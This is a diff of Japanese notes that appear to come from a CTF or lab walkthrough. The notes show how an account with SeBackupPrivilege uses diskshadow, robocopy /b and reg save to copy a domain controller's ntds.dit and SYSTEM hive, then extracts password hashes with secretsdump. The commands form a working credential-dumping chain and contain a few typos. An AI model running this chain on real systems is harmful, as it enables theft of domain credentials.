@@ -27,21 +27,66 @@ SeRestorePrivilege            Restore files and directories  Enabled
 SeShutdownPrivilege           Shut down the system           Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-*Evil-WinRM* PS C:\Users\svc_backup> whoami /groups
+```
 
-GROUP INFORMATION
------------------
 
-Group Name                                 Type             SID          Attributes
-========================================== ================ ============ ==================================================
-Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\High Mandatory Level
+# 実際にやってみた（参考：[Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)）
+
+ntds.ditのコピーにおいて、普通の`copy`コマンドではpermission deniedになってしまう。そこで`robocopy`を使う。特に`/b`（または`/B`）フラグで**バックアップとして**コピーができる。つまりAdmin権限がなくても、backupユーザの権限があればpermission deniedにならない（[robocopyについての詳細](https://n-archives.net/software/robosync/articles/robocopy-specs-and-command/#i-3-1)）
+
+*注）先に`mkdir C:\temp`として一時的なディレクトリを作っておく*
+
+-> しかし`PS C:\temp> roboropy C:\Windoes\NTDS\ntds.dit . ntds.dit`というふうに直接コピーすると、現在アクティブなのでコピーできないと言われる。
+
+-> そこで新しいドライブを作り、`diskshadow`でドライブ間のコピーを行うという方法をとる
+
+（スクリプト）
+
+```
+┌──(kali㉿kali)-[~]
+└─$ cat back_script.txt
+set verbose onX
+set metadata C:\Windows\Temp\meta.cabX
+set context clientaccessibleX
+set context persistentX
+begin backupX
+add volume C: alias cdriveX
+createX
+expose %cdrive% E:X
+end backupX
+```
+
+- スクリプトターゲット上にアップロード（遅かったらsmb使おう）：
+
+```
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> upload /home/kali/back_scrip.txt
+```
+
+- `diskshadow`コマンドにスクリプトを指定して実行：
+
+```
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> diskshadow /s back_script.txt
+```
+
+これで E:\ ドライブに C:\ ドライブの内容がコピーされた。E:\は現在アクティブじゃないから、`robocopy`が使える：
+
+```
+*Evil-WinRM* PS E:\> cd C:\ 
+*Evil-WinRM* PS C:\> mkdir tmp
+*Evil-WinRM* PS C:\> cd tmp
+*Evil-WinRM* PS C:\temp> robocopy /b E:\Windows\ntds . ntds.dit
+```
+
+- ntds.ditの復号にはレジストリのキーが必要なのでそれをロードする：
+
+```
+*Evil-WinRM* PS C:\temp> reg save hklm\system c:\temp\system
+```
+
+その後**ntds.dit**と**system**をKaliに転送する。
+
+Kali上でcrack：
+
+```
+secretsdump.py -system system -ntds ntds.dit LOCAL
 ```
